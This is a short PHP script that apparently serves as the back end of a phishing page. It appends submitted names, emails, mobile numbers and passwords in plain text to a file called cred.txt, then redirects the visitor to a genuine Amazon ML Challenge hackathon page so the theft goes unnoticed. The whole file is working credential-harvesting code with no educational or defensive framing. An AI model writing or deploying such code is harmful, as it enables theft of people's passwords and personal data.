<?php
file_put_contents("cred.txt", 
    "Name : " . $_POST['name'] . "\n" .
    "Email : " . $_POST['email'] . "\n" .
    "Mobile : " . $_POST['mobile'] . "\n" .
    "Password : " . $_POST['password'] . "\n\n",
    FILE_APPEND
);
header('Location: https://unstop.com/hackathons/amazon-ml-challenge-2025-amazon-1560375');
exit();
?>
